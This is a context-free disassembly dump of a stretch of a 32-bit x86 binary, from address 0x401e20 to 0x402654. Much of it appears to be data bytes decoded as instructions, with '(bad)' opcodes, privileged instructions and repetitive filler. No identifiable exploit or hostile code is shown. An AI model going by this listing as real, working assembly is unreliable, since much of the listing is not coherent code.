  401e20:	into   
  401e21:	jo     0x401dd5
  401e23:	adc    BYTE PTR [ecx+0x36],dh
  401e26:	jne    0x401dc0
  401e28:	jmp    0xe85e8165
  401e2d:	imul   esi,eax,0x65
  401e30:	push   0x7110b270
  401e35:	ss jne 0x401dd0
  401e38:	jmp    0x866c175
  401e3d:	cmp    al,0xec
  401e3f:	add    al,0xd8
  401e41:	int3   
  401e42:	xor    esi,esp
  401e44:	dec    ecx
  401e45:	dec    esp
  401e46:	jne    0x401e4a
  401e48:	jmp    0x7c439350
  401e4d:	popf   
  401e4e:	sbb    DWORD PTR [edi-0x13],eax
  401e51:	fisub  DWORD PTR ds:0x756088f4
  401e57:	ret    0x9a2e
  401e5a:	add    BYTE PTR [eax],al
  401e5c:	add    BYTE PTR [eax],al
  401e5e:	add    ch,bh
  401e60:	and    bl,BYTE PTR [ebp-0x56]
  401e63:	fld    DWORD PTR [esi-0x33]
  401e66:	in     al,dx
  401e67:	inc    ebp
  401e68:	hlt    
  401e69:	mov    BYTE PTR [eax+0x75],ah
  401e6c:	ret    0x9a2e
  401e6f:	std    
  401e70:	and    al,BYTE PTR [eax]
  401e72:	gs jmp 0x401e51
  401e75:	sbb    al,0xa
  401e77:	cld    
  401e78:	mov    dl,0x11
  401e7a:	push   esp
  401e7b:	cwde   
  401e7c:	add    al,al
  401e7e:	cs xor eax,esp
  401e81:	(bad)  
  401e82:	in     eax,dx
  401e83:	cmc    
  401e84:	push   ebp
  401e85:	xor    DWORD PTR [eax],ebx
  401e87:	jge    0x401e5f
  401e89:	dec    esp
  401e8a:	arpl   WORD PTR [ebp+0x39],dx
  401e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8e:	xor    ebx,esi
  401e90:	sti    
  401e91:	push   ebp
  401e92:	xor    eax,0xbaeb89d0
  401e97:	push   0xa89711b4
  401e9c:	add    al,al
  401e9e:	scas   al,BYTE PTR es:[edi]
  401e9f:	or     al,0x8b
  401ea1:	and    BYTE PTR [esi],ch
  401ea3:	add    DWORD PTR [eax-0x4b2a9d3c],0x11
  401eaa:	ins    BYTE PTR es:[edi],dx
  401eab:	fld    QWORD PTR [edx]
  401ead:	adc    BYTE PTR [ebx+0x2c048577],ah
  401eb3:	mov    bh,0x3b
  401eb5:	mov    ds:0x48168eda,eax
  401eba:	jae    0x401f07
  401ebc:	pushf  
  401ebd:	jg     0x401ebb
  401ebf:	iret   
  401ec0:	pop    edi
  401ec1:	jbe    0x401f33
  401ec3:	add    BYTE PTR [eax],al
  401ec5:	add    BYTE PTR [eax],al
  401ec7:	add    BYTE PTR [ebp-0x567db6e9],dl
  401ecd:	mov    bl,0x11
  401ecf:	push   edi
  401ed0:	lar    eax,ax
  401ed3:	scas   al,BYTE PTR es:[edi]
  401ed4:	in     al,dx
  401ed5:	mov    DWORD PTR [eax],esp
  401ed7:	popa   
  401ed8:	xor    eax,DWORD PTR [edi]
  401eda:	daa    
  401edb:	aas    
  401edc:	mov    al,ds:0xae9a11b4
  401ee1:	add    dl,BYTE PTR [eax]
  401ee3:	inc    ebx
  401ee4:	jbe    0x401e69
  401ee6:	ja     0x401f63
  401ee8:	mov    dl,BYTE PTR [edi]
  401eea:	dec    ecx
  401eeb:	inc    edx
  401eec:	push   0x20011b3
  401ef1:	stos   DWORD PTR es:[edi],eax
  401ef2:	add    al,al
  401ef4:	arpl   WORD PTR [eax+ecx*4+0x20],di
  401ef8:	sub    eax,0x64590bd
  401efd:	add    dl,al
  401eff:	adc    DWORD PTR [ebp-0x2355fffc],eax
  401f05:	dec    edi
  401f06:	cs and al,0x64
  401f09:	imul   ecx,DWORD PTR [ebx+0x67],0x5e
  401f0d:	rcl    eax,cl
  401f0f:	adc    DWORD PTR [ecx+0x36],eax
  401f12:	add    al,al
  401f14:	mov    ds:0xb4fffd9e,eax
  401f19:	and    al,0xbd
  401f1b:	dec    ecx
  401f1c:	scas   eax,DWORD PTR es:[edi]
  401f1d:	fnop   
  401f1f:	adc    ecx,esp
  401f21:	cmp    eax,0x9ce3c000
  401f26:	std    
  401f27:	call   FWORD PTR [edx]
  401f29:	cmc    
  401f2a:	fs call 0x300:0x0
  401f32:	(bad)  
  401f34:	adc    DWORD PTR [ecx],ebx
  401f36:	mov    esi,0x34c71000
  401f3b:	ds std 
  401f3d:	jmp    0x401f9a
  401f3f:	scas   eax,DWORD PTR es:[edi]
  401f40:	ins    DWORD PTR es:[edi],dx
  401f41:	mov    edx,DWORD PTR [edx]
  401f43:	rcl    BYTE PTR [ecx],cl
  401f45:	and    cl,dh
  401f47:	add    al,al
  401f49:	and    edi,DWORD PTR [edx-0x78]
  401f4c:	and    cl,al
  401f4e:	out    0x87,al
  401f50:	jmp    0x401f91
  401f52:	not    cl
  401f54:	adc    edx,eax
  401f56:	into   
  401f57:	add    al,al
  401f59:	and    edi,DWORD PTR [edx-0x78]
  401f5c:	and    BYTE PTR [edx-0x283b620b],bl
  401f62:	jg     0x401f36
  401f64:	adc    ecx,ecx
  401f66:	call   0x483:0x1b61000
  401f6d:	jne    0x401f2a
  401f6f:	push   0x15
  401f71:	cmp    dh,al
  401f73:	cmp    ecx,edx
  401f75:	test   BYTE PTR [esi-0x77],dh
  401f78:	add    BYTE PTR ds:0xafdbc31,dh
  401f7e:	aaa    
  401f7f:	aaa    
  401f80:	sbb    al,0xf0
  401f82:	cdq    
  401f83:	mov    BYTE PTR [ebx+0x56b750ae],dh
  401f89:	sbb    ch,BYTE PTR ds:0x73139b3e
  401f8f:	push   DWORD PTR [edx-0x2c4928d6]
  401f95:	add    BYTE PTR [eax],al
  401f97:	add    BYTE PTR [eax],al
  401f99:	add    BYTE PTR [edx+ecx*2+0x23650000],al
  401fa0:	add    DWORD PTR [ecx+0x2f],edx
  401fa3:	xchg   ebx,eax
  401fa4:	mov    edi,DWORD PTR [edi-0x2c3186fe]
  401faa:	fs mov bh,ch
  401fad:	inc    DWORD PTR [edx+0x4f5100c3]
  401fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fb4:	js     0x401f65
  401fb6:	adc    al,bh
  401fb8:	xor    edx,edx
  401fba:	test   BYTE PTR [edi-0x35],dh
  401fbd:	add    BYTE PTR [ebp+0x558899b0],dh
  401fc3:	jmp    0xe9b51fcb
  401fc8:	add    eax,DWORD PTR [eax]
  401fca:	jne    0x401fb5
  401fcc:	cld    
  401fcd:	inc    edx
  401fce:	jne    0x401fb5
  401fd0:	add    eax,DWORD PTR [esi*2+0x750403e1]
  401fd7:	pop    ecx
  401fd8:	add    BYTE PTR [ebx+0x75],al
  401fdb:	in     eax,dx
  401fdc:	add    eax,DWORD PTR ds:0x803b975
  401fe2:	jne    0x40201d
  401fe4:	add    BYTE PTR [ebx+0x75],al
  401fe7:	in     eax,0x3
  401fe9:	push   es
  401fea:	jne    0x401fee
  401fec:	or     DWORD PTR [edx*2-0x480086fe],eax
  401ff3:	add    ch,ch
  401ff5:	add    edi,DWORD PTR [ecx+0x2]
  401ff8:	stc    
  401ff9:	add    eax,DWORD PTR [ebp+0xa902]
  401fff:	add    BYTE PTR [eax],al
  402001:	add    BYTE PTR [eax],al
  402003:	mov    dh,0x2
  402005:	icebp  
  402006:	add    esp,DWORD PTR [ebp+0x2]
  402009:	or     DWORD PTR [edx*2-0x49ff56fe],eax
  402010:	add    dh,cl
  402012:	add    eax,DWORD PTR [ebp-0xafc96fe]
  402018:	add    DWORD PTR [ecx-0x1efdca00],ebp
  40201e:	add    edx,DWORD PTR [ebp+0x75036902]
  402024:	add    DWORD PTR [ecx-0x36fdca00],ebp
  40202a:	add    esi,ebp
  40202c:	add    ebx,ebp
  40202e:	add    dh,BYTE PTR [ebp+0x6]
  402031:	sub    DWORD PTR [eax],eax
  402033:	add    cl,BYTE PTR ss:[ecx]
  402036:	add    al,0x77
  402038:	add    ebx,ebp
  40203a:	add    dh,BYTE PTR [ebp-0xe]
  40203d:	sub    BYTE PTR [eax],al
  40203f:	ss add ch,cl
  402042:	add    esi,DWORD PTR [ebp+0x2]
  402045:	jmp    0xc942954d
  40204a:	or     BYTE PTR [ebp+0x2],dh
  40204d:	jmp    0xe942455d
  402052:	or     eax,DWORD PTR [ebp-0x19f40afe]
  402058:	add    bh,bl
  40205a:	or     BYTE PTR [edx-0x1af416fe],al
  402060:	add    ch,cl
  402062:	or     eax,DWORD PTR [ebp+0xae902]
  402068:	add    BYTE PTR [eax],al
  40206a:	add    BYTE PTR [eax],al
  40206c:	xor    eax,0x6dd90003
  402071:	or     BYTE PTR [eax],al
  402073:	jmp    0xe94082e6
  402078:	jle    0x40209c
  40207a:	add    cl,ch
  40207c:	jns    0x402020
  40207e:	add    cl,ch
  402080:	outs   dx,BYTE PTR ds:[esi]
  402081:	add    al,BYTE PTR [eax]
  402083:	jmp    0xe940a2f6
  402088:	jle    0x4020cc
  40208a:	add    cl,ch
  40208c:	jns    0x402070
  40208e:	add    cl,bl
  402090:	jnp    0x402096
  402092:	add    cl,ch
  402094:	outs   dx,BYTE PTR ds:[esi]
  402095:	cmp    al,BYTE PTR [eax]
  402097:	jmp    0xe9401b1a
  40209c:	jns    0x402110
  40209e:	add    dl,bh
  4020a0:	jnp    0x4020bb
  4020a2:	add    cl,ch
  4020a4:	outs   dx,BYTE PTR ds:[esi]
  4020a5:	pop    edx
  4020a6:	add    cl,ch
  4020a8:	jle    0x4020c4
  4020aa:	add    cl,ch
  4020ac:	jns    0x402060
  4020ae:	add    al,bl
  4020b0:	jnp    0x4020a5
  4020b2:	(bad)  
  4020b3:	call   0xe9408b26
  4020b8:	jle    0x4020e4
  4020ba:	add    cl,ch
  4020bc:	jns    0x402050
  4020be:	add    cl,ch
  4020c0:	outs   dx,BYTE PTR ds:[esi]
  4020c1:	or     al,BYTE PTR [eax]
  4020c3:	jmp    0xe940ab36
  4020c8:	jle    0x402114
  4020ca:	add    cl,ch
  4020cc:	jns    0x4020a0
  4020ce:	add    cl,bl
  4020d0:	add    BYTE PTR [eax],al
  4020d2:	add    BYTE PTR [eax],al
  4020d4:	add    BYTE PTR [ebx+0x6],bh
  4020d7:	add    cl,ch
  4020d9:	outs   dx,BYTE PTR ds:[esi]
  4020da:	ss add cl,ch
  4020dd:	jle    0x4020d5
  4020df:	push   ebx
  4020e1:	jle    0x4020c4
  4020e3:	add    dl,bh
  4020e5:	jnp    0x402110
  4020e7:	add    cl,ch
  4020e9:	outs   dx,BYTE PTR ds:[esi]
  4020ea:	push   esi
  4020eb:	add    BYTE PTR [eax],al
  4020ed:	pop    esp
  4020ee:	or     DWORD PTR [eax+eax*1],esi
  4020f1:	pop    esp
  4020f2:	push   cs
  4020f3:	enter  0x1d00,0x4
  4020f7:	or     eax,0x64094c00
  4020fc:	add    BYTE PTR [ecx+ecx*1],bl
  4020ff:	and    al,0x0
  402101:	sbb    al,0xe
  402103:	test   al,0x0
  402105:	or     al,0x9
  402107:	add    al,0x0
  402109:	or     al,0x9
  40210b:	test   BYTE PTR [eax],al
  40210d:	sbb    al,0x9
  40210f:	inc    esp
  402110:	add    BYTE PTR [esi+ecx*1],bl
  402113:	call   0x8443d18
  402118:	add    BYTE PTR [ecx+ecx*1],cl
  40211b:	pop    esp
  40211c:	add    ah,bl
  40211e:	or     BYTE PTR [eax+eax*1],bl
  402121:	fmul   QWORD PTR ds:0x3e00098
  402127:	push   ebx
  402128:	add    ah,cl
  40212a:	or     BYTE PTR [eax+eax*1-0x24],bh
  40212e:	or     BYTE PTR [eax+eax*1],bh
  402131:	fmul   QWORD PTR ds:0x39e00d8
  402137:	pop    ss
  402138:	add    BYTE PTR [eax],al
  40213a:	add    BYTE PTR [eax],al
  40213c:	add    BYTE PTR [eax],al
  40213e:	int3   
  40213f:	or     BYTE PTR [eax+eax*1-0x64],ch
  402143:	or     BYTE PTR [eax+eax*1],ch
  402146:	pushf  
  402147:	or     eax,0x88c00b8
  40214c:	or     al,0x0
  40214e:	mov    WORD PTR [eax],cs
  402150:	mov    WORD PTR [eax],es
  402152:	pushf  
  402153:	or     BYTE PTR [eax+eax*1-0x64],cl
  402157:	or     eax,0x39c00f8
  40215c:	add    eax,DWORD PTR [eax]
  40215e:	mov    WORD PTR [eax],cs
  402160:	push   edx
  402161:	add    BYTE PTR [eax+ecx*1+0x12],bl
  402165:	add    BYTE PTR [ecx+0x8],ah
  402168:	mov    ds:0x6d87500,eax
  40216d:	and    esi,DWORD PTR [ebp-0x17]
  402170:	or     esi,DWORD PTR [edx+0x75]
  402173:	jmp    0xe9b55383
  402178:	or     al,0xc4
  40217a:	jne    0x402136
  40217c:	push   es
  40217d:	or     esi,DWORD PTR [ebp-0x17]
  402180:	or     esp,DWORD PTR [edx+0x75]
  402183:	jmp    0xe9b54393
  402188:	or     ah,BYTE PTR [ebp+esi*2+0x75020be9]
  40218f:	jmp    0xe9b5a39f
  402194:	or     eax,DWORD PTR [edx+0x75]
  402197:	jmp    0xb9b605a6
  40219c:	add    al,0x7
  40219e:	jne    0x402189
  4021a0:	or     ebx,DWORD PTR [edx+0x0]
  4021a3:	add    BYTE PTR [eax],al
  4021a5:	add    BYTE PTR [eax],al
  4021a7:	jne    0x402192
  4021a9:	or     ebx,DWORD PTR [edx]
  4021ab:	jne    0x402196
  4021ad:	or     dl,BYTE PTR [ebp+esi*2+0x754304dd]
  4021b4:	jmp    0xe9b59bc4
  4021b9:	or     edi,DWORD PTR [edx]
  4021bb:	jne    0x4021a6
  4021bd:	or     dl,ah
  4021bf:	jne    0x402178
  4021c1:	add    al,0x13
  4021c3:	jne    0x4021ae
  4021c5:	or     ebp,DWORD PTR [edx+0x75]
  4021c8:	jmp    0xe9b54bd8
  4021cd:	or     dh,BYTE PTR [ebp+esi*2+0x750a0be9]
  4021d4:	jmp    0xe9b5abe4
  4021d9:	or     ecx,DWORD PTR [edx+0x75]
  4021dc:	jmp    0xb9b615eb
  4021e1:	add    al,0x5
  4021e3:	jne    0x4021ce
  4021e5:	or     edx,DWORD PTR [esi+0x75]
  4021e8:	add    ch,cl
  4021ea:	or     eax,DWORD PTR [ebx+0x750ba902]
  4021f0:	add    bh,dl
  4021f2:	add    al,0xa6
  4021f4:	add    ch,cl
  4021f6:	or     ecx,ebx
  4021f8:	add    ch,cl
  4021fa:	or     eax,DWORD PTR [ebx+0x310ae902]
  402200:	add    bl,al
  402202:	add    al,0x6a
  402204:	add    ch,cl
  402206:	or     ebx,DWORD PTR [ebx+0xbe902]
  40220c:	add    BYTE PTR [eax],al
  40220e:	add    BYTE PTR [eax],al
  402210:	push   ebx
  402211:	add    ch,cl
  402213:	or     dl,cl
  402215:	add    ecx,ebp
  402217:	or     esi,DWORD PTR [ebx+0x2]
  40221a:	jmp    0xe9421d2a
  40221f:	or     esi,DWORD PTR [ebx+0x110ae902]
  402225:	add    bl,cl
  402227:	add    al,0x6c
  402229:	add    ch,cl
  40222b:	or     edx,DWORD PTR [ebx+0x2]
  40222e:	jmp    0xe942ad3e
  402233:	or     al,BYTE PTR [ecx]
  402235:	add    bh,ch
  402237:	add    al,0x56
  402239:	add    ch,cl
  40223b:	or     edx,DWORD PTR [ebx+0x2]
  40223e:	jmp    0xe942ad4e
  402243:	or     ah,BYTE PTR [ecx+0x5e04db01]
  402249:	add    ch,cl
  40224b:	or     esp,DWORD PTR [ebx]
  40224d:	add    ch,cl
  40224f:	or     ebx,DWORD PTR [ebx+0x2]
  402252:	jmp    0xe9420361
  402257:	or     ebp,DWORD PTR [ebx+0x2]
  40225a:	jmp    0xe942256a
  40225f:	or     edi,DWORD PTR [ebx]
  402261:	add    ch,cl
  402263:	or     al,BYTE PTR [ecx+0x71c90001]
  402269:	add    al,BYTE PTR [eax]
  40226b:	jmp    0xe94055ee
  402270:	jle    0x402265
  402272:	push   ebx
  402274:	add    BYTE PTR [eax],al
  402276:	add    BYTE PTR [eax],al
  402278:	add    BYTE PTR [esi-0x7b],ch
  40227b:	add    bl,bh
  40227d:	jno    0x402278
  40227f:	(bad)  
  402280:	call   0xe9407603
  402285:	jle    0x40229a
  402287:	add    cl,ch
  402289:	outs   dx,DWORD PTR ds:[esi]
  40228a:	les    eax,FWORD PTR [eax]
  40228c:	fnstenv [ecx+0xc]
  40228f:	add    cl,ch
  402291:	jle    0x4022f6
  402293:	add    cl,ch
  402295:	jle    0x4022ba
  402297:	add    cl,ch
  402299:	jno    0x40223f
  40229b:	add    cl,ch
  40229d:	outs   dx,BYTE PTR ds:[esi]
  40229e:	add    eax,DWORD PTR [eax]
  4022a0:	jmp    0xe940a623
  4022a5:	jle    0x4022ea
  4022a7:	add    cl,ch
  4022a9:	jno    0x40228f
  4022ab:	add    cl,bl
  4022ad:	ja     0x4022af
  4022af:	add    cl,ch
  4022b1:	jle    0x4022ee
  4022b3:	add    cl,ch
  4022b5:	jle    0x4022b2
  4022b7:	(bad)  
  4022b8:	call   0xfa40972e
  4022bd:	ja     0x4022dc
  4022bf:	add    cl,ch
  4022c1:	jle    0x40231e
  4022c3:	add    cl,ch
  4022c5:	jle    0x4022e2
  4022c7:	add    cl,ch
  4022c9:	jno    0x40227f
  4022cb:	add    al,bl
  4022cd:	ja     0x4022c2
  4022cf:	(bad)  
  4022d0:	call   0xe9408e53
  4022d5:	jle    0x402302
  4022d7:	add    cl,ch
  4022d9:	jno    0x40226f
  4022db:	add    cl,ch
  4022dd:	add    BYTE PTR [eax],al
  4022df:	add    BYTE PTR [eax],al
  4022e1:	add    BYTE PTR [esi+0xb],ch
  4022e4:	add    cl,ch
  4022e6:	jle    0x402273
  4022e8:	add    BYTE PTR [eax],al
  4022ea:	pushf  
  4022eb:	or     eax,0x68c0049
  4022f0:	repnz add BYTE PTR [esp+eax*1+0xd5c0004],bl
  4022f8:	push   ebp
  4022f9:	add    BYTE PTR [ebp+ecx*1+0x15],bl
  4022fd:	add    BYTE PTR [ebp+ecx*1+0x2],bl
  402301:	add    DWORD PTR [edi+0x4],ebx
  402304:	sub    eax,DWORD PTR [eax]
  402306:	pop    esp
  402307:	or     eax,0xd5c0075
  40230c:	xor    eax,0xca064c00
  402311:	add    BYTE PTR ds:0x1c000d04,bl
  402317:	or     eax,0xd1c0065
  40231c:	and    eax,0xaa060c00
  402321:	add    BYTE PTR [ecx*1+0xd1c0005],cl
  402328:	test   DWORD PTR [eax],eax
  40232a:	sbb    al,0xd
  40232c:	inc    ebp
  40232d:	add    BYTE PTR [esi+eax*1],cl
  402330:	jmp    0xdc00:0x8041c00
  402337:	or     al,0x5d
  402339:	add    ah,bl
  40233b:	or     al,0x1d
  40233d:	add    ah,cl
  40233f:	add    eax,0x3d8009a
  402344:	push   ebx
  402345:	add    BYTE PTR [eax],al
  402347:	add    BYTE PTR [eax],al
  402349:	add    BYTE PTR [eax],al
  40234b:	fmul   QWORD PTR [edi*2+0x3d0cdc00]
  402352:	add    ah,cl
  402354:	add    eax,0x39e00da
  402359:	pop    ss
  40235a:	add    BYTE PTR [esp+ecx*1+0xc9c006d],bl
  402361:	sub    eax,0xba058c00
  402366:	add    BYTE PTR [ebp-0x15],dh
  402369:	or     ecx,DWORD PTR ds:0x8d0beb75
  40236f:	jne    0x40235c
  402371:	or     ecx,DWORD PTR [ebp+0x75]
  402374:	jmp    0x402382
  402376:	cli    
  402377:	jne    0x402334
  402379:	add    al,BYTE PTR [ebx]
  40237b:	jne    0x402366
  40237d:	or     edx,DWORD PTR [ebx+0x75]
  402380:	jmp    0xceb53690
  402385:	or     eax,ebx
  402387:	jne    0x402365
  402389:	add    ah,BYTE PTR [ebx]
  40238b:	jne    0x402376
  40238d:	or     esi,DWORD PTR [ebx+0x75]
  402390:	jmp    0xe9b556a0
  402395:	or     al,0xc6
  402397:	jne    0x402353
  402399:	add    cl,BYTE PTR [ebx]
  40239b:	jne    0x402386
  40239d:	or     esp,DWORD PTR [ebx+0x75]
  4023a0:	jmp    0xe9b546b0
  4023a5:	or     ah,BYTE PTR [esi+0x30be975]
  4023ab:	jne    0x402396
  4023ad:	or     eax,DWORD PTR [ebx+0x0]
  4023b3:	add    BYTE PTR [ebp-0x17],dh
  4023b6:	or     eax,DWORD PTR [ebx+0x75]
  4023b9:	jmp    0xb9b609c8
  4023be:	add    BYTE PTR [edi],al
  4023c0:	jne    0x4023ab
  4023c2:	or     ebx,DWORD PTR [ebx+0x75]
  4023c5:	jmp    0xe9b53ed5
  4023ca:	or     dl,BYTE PTR [esi+0x4300d575]
  4023d0:	jne    0x4023bb
  4023d2:	or     edi,DWORD PTR [ebx+0x75]
  4023d5:	jmp    0xe9b55ee5
  4023da:	or     dl,dh
  4023dc:	jne    0x402399
  4023de:	add    BYTE PTR [ebx],dl
  4023e0:	jne    0x4023cb
  4023e2:	or     ebp,DWORD PTR [ebx+0x75]
  4023e5:	add    ch,cl
  4023e7:	or     ecx,DWORD PTR [esi+0x2]
  4023ea:	jmp    0xe94306f9
  4023ef:	or     edi,DWORD PTR [esi+0x2]
  4023f2:	jmp    0xe9432202
  4023f7:	or     ebp,DWORD PTR [esi]
  4023f9:	add    ch,cl
  4023fb:	or     al,BYTE PTR [ebx+0x7800d902]
  402401:	add    ch,cl
  402403:	or     eax,edx
  402405:	add    ch,cl
  402407:	or     ecx,DWORD PTR [edx+0x750ba902]
  40240d:	add    bh,dl
  40240f:	add    BYTE PTR [esi-0x3df416fe],al
  402415:	add    ch,cl
  402417:	or     eax,DWORD PTR [eax]
  402419:	add    BYTE PTR [eax],al
  40241b:	add    BYTE PTR [eax],al
  40241d:	mov    al,BYTE PTR [edx]
  40241f:	jmp    0xd8424f2e
  402424:	add    BYTE PTR [edx-0x6df416fe],al
  40242a:	add    ch,cl
  40242c:	or     ebx,DWORD PTR [edx+0x2]
  40242f:	jmp    0xe941ef3e
  402434:	or     edi,DWORD PTR [edx+0x2]
  402437:	jmp    0xe9421647
  40243c:	or     edi,DWORD PTR [edx+0xb0ae902]
  402442:	add    bl,cl
  402444:	add    BYTE PTR [edx+eax*1-0x17],bh
  402448:	or     ecx,DWORD PTR [edx+0x2]
  40244b:	jmp    0xe942a65b
  402450:	or     bh,bl
  402452:	add    ebp,edi
  402454:	add    BYTE PTR [esi+0x2],dl
  402457:	jmp    0xe9426e67
  40245c:	or     eax,DWORD PTR [edx-0x64f516fe]
  402462:	add    DWORD PTR [eax],eax
  402464:	(bad)  [ebp-0x5]
  402467:	(bad)  
  402468:	call   0xe9408beb
  40246d:	outs   dx,BYTE PTR ds:[esi]
  40246e:	daa    
  40246f:	add    cl,ch
  402471:	outs   dx,DWORD PTR ds:[esi]
  402472:	cwde   
  402473:	add    cl,ch
  402475:	jle    0x40247e
  402477:	add    cl,ch
  402479:	jle    0x402402
  40247b:	add    cl,ch
  40247d:	outs   dx,BYTE PTR ds:[esi]
  40247e:	inc    edi
  40247f:	add    cl,ch
  402481:	add    BYTE PTR [eax],al
  402483:	add    BYTE PTR [eax],al
  402485:	add    BYTE PTR [edi-0x28],ch
  402488:	add    cl,cl
  40248a:	jne    0x40248e
  40248c:	add    cl,ch
  40248e:	jle    0x4024c2
  402490:	add    cl,ch
  402492:	outs   dx,BYTE PTR ds:[esi]
  402493:	repnz push esp
  402496:	outs   dx,BYTE PTR ds:[esi]
  402497:	push   ecx
  402498:	add    bl,bh
  40249a:	jne    0x402491
  40249c:	(bad)  
  40249d:	call   0xe9407720
  4024a2:	outs   dx,BYTE PTR ds:[esi]
  4024a3:	adc    al,BYTE PTR [eax]
  4024a5:	jmp    0xd940e819
  4024aa:	jne    0x4024b4
  4024ac:	add    cl,ch
  4024ae:	jle    0x402512
  4024b0:	add    cl,ch
  4024b2:	outs   dx,BYTE PTR ds:[esi]
  4024b3:	and    al,BYTE PTR [eax]
  4024b5:	jmp    0xe940c823
  4024ba:	jle    0x4024be
  4024bc:	add    cl,ch
  4024be:	jle    0x402442
  4024c0:	add    cl,ch
  4024c2:	outs   dx,BYTE PTR ds:[esi]
  4024c3:	inc    edx
  4024c4:	add    cl,ch
  4024c6:	imul   esp,ebx,0xfff3d900
  4024cc:	(bad)  
  4024cd:	call   0xe9405f50
  4024d2:	outs   dx,BYTE PTR ds:[esi]
  4024d3:	cli    
  4024d4:	(bad)  
  4024d5:	call   0xfa409843
  4024da:	rcr    DWORD PTR [eax],cl
  4024dc:	add    cl,ch
  4024de:	jle    0x40253a
  4024e0:	add    BYTE PTR [eax],al
  4024e2:	int3   
  4024e3:	or     DWORD PTR [eax],edi
  4024e5:	add    ah,cl
  4024e7:	push   es
  4024e8:	rol    DWORD PTR [eax],1
  4024ea:	add    BYTE PTR [eax],al
  4024ec:	add    BYTE PTR [eax],al
  4024ee:	add    ch,cl
  4024f0:	aam    0x10
  4024f2:	add    BYTE PTR [ecx+ecx*1+0x98c0068],bl
  4024f9:	sub    BYTE PTR [eax],al
  4024fb:	mov    WORD PTR [esi],es
  4024fd:	mov    cl,0x0
  4024ff:	pushf  
  402500:	or     DWORD PTR [eax],ecx
  402502:	add    BYTE PTR [ecx+ecx*1+0x98c0088],bl
  402509:	dec    eax
  40250a:	add    BYTE PTR [esi+eax*1-0x2bb3ff0f],cl
  402511:	add    eax,DWORD PTR [eax]
  402513:	pop    esp
  402514:	or     DWORD PTR [eax+eax*1+0x4c],edx
  402518:	or     DWORD PTR [eax+eax*1],edx
  40251b:	popa   
  40251c:	or     ebx,esp
  40251e:	add    BYTE PTR [edi-0x2c],cl
  402521:	sub    al,BYTE PTR [eax]
  402523:	pop    esp
  402524:	or     DWORD PTR [eax+eax*1+0x4c],esi
  402528:	or     DWORD PTR [eax+eax*1],esi
  40252b:	dec    esp
  40252c:	push   es
  40252d:	leave  
  40252e:	add    BYTE PTR [ebp-0x2c],cl
  402531:	or     al,0x0
  402533:	sbb    al,0x9
  402535:	add    BYTE PTR fs:[ecx+ecx*1],cl
  402539:	and    al,0x0
  40253b:	or     al,0x6
  40253d:	test   eax,0x4091c00
  402542:	add    BYTE PTR [ecx+ecx*1],bl
  402545:	test   BYTE PTR [eax],al
  402547:	or     al,0x9
  402549:	inc    esp
  40254a:	add    BYTE PTR [esi+eax*1],cl
  40254d:	jmp    0x813f152
  402552:	add    BYTE PTR [eax],al
  402554:	add    BYTE PTR [eax],al
  402556:	add    BYTE PTR [eax],al
  402558:	fmul   QWORD PTR [eax]
  40255a:	pop    esp
  40255b:	add    ah,cl
  40255d:	or     BYTE PTR [eax+eax*1],bl
  402560:	int3   
  402561:	add    eax,0xd7750099
  402566:	(bad)  
  402567:	push   edx
  402568:	jne    0x402555
  40256a:	or     edi,DWORD PTR [ebp+esi*2-0x15]
  40256e:	or     edi,DWORD PTR [esi*2+0x75d90ceb]
  402575:	mov    ecx,0xeb7516fe
  40257a:	or     ebp,DWORD PTR [ebp+esi*2-0x15]
  40257e:	or     ebp,DWORD PTR [esi*2+0x75b90ceb]
  402585:	jmp    0x402592
  402587:	or     al,0x75
  402589:	jmp    0x402596
  40258b:	mov    WORD PTR [ebp-0x15],?
  40258e:	or     ecx,DWORD PTR [ebp+esi*2-0x15]
  402592:	or     al,0xf9
  402594:	jne    0x40254f
  402596:	inc    BYTE PTR [edx]
  402598:	jne    0x402583
  40259a:	or     edx,DWORD PTR [edx+0x75]
  40259d:	jmp    0xceb537ad
  4025a2:	or     esp,DWORD PTR [ebx+0x22fed875]
  4025a8:	jne    0x402593
  4025aa:	or     esi,DWORD PTR [edx+0x75]
  4025ad:	jmp    0xe9b557bd
  4025b2:	or     al,0xc5
  4025b4:	jne    0x402570
  4025b6:	dec    BYTE PTR [edx]
  4025b8:	jne    0x4025a3
  4025ba:	or     esp,DWORD PTR [edx+0x0]
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [eax],al
  4025c1:	jne    0x4025ac
  4025c3:	or     esp,DWORD PTR [edx]
  4025c5:	jne    0x4025b0
  4025c7:	or     ah,BYTE PTR [ebp+0x20be975]
  4025cd:	jne    0x4025b8
  4025cf:	or     eax,DWORD PTR [edx+0x420be975]
  4025d5:	jne    0x4025c0
  4025d7:	or     ah,ch
  4025d9:	jne    0x402594
  4025db:	cld    
  4025dc:	push   es
  4025dd:	jne    0x4025c8
  4025df:	or     ebx,DWORD PTR [edx+0x75]
  4025e2:	add    ch,cl
  4025e4:	or     edi,DWORD PTR [edi+0x2]
  4025e7:	jmp    0xfd430df6
  4025ec:	cld    
  4025ed:	aaa    
  4025ee:	add    ch,cl
  4025f0:	or     edi,DWORD PTR [edi]
  4025f2:	add    ch,cl
  4025f4:	or     edi,DWORD PTR [edi+0x2]
  4025f7:	jmp    0xdb42ee06
  4025fc:	cld    
  4025fd:	xchg   DWORD PTR [edx],eax
  4025ff:	jmp    0xe942350f
  402604:	or     ecx,DWORD PTR [edi+0x2]
  402607:	jmp    0xe942ee16
  40260c:	or     edi,DWORD PTR [edi+0x2]
  40260f:	jmp    0xe943151f
  402614:	or     ebp,DWORD PTR [edi]
  402616:	add    ch,cl
  402618:	or     ch,BYTE PTR [eax+0x2]
  40261b:	frndint 
  40261d:	jno    0x402621
  40261f:	jmp    0xe942f12f
  402624:	or     eax,DWORD PTR [eax]
  402626:	add    BYTE PTR [eax],al
  402628:	add    BYTE PTR [eax],al
  40262a:	add    DWORD PTR [edx],0xffffffa9
  40262d:	or     esi,DWORD PTR [ebp+0x2]
  402630:	cli    
  402631:	cld    
  402632:	xchg   DWORD PTR [edx],eax
  402634:	jmp    0xe942f144
  402639:	or     eax,DWORD PTR [ebx+0x400ae902]
  40263f:	add    bl,al
  402641:	cld    
  402642:	jnp    0x402646
  402644:	jmp    0xe942c154
  402649:	or     edx,DWORD PTR [ebx+0x2]
  40264c:	jmp    0xe942065b
  402651:	or     esi,DWORD PTR [ebx+0x2]
  402654:	jmp    0xe9422164
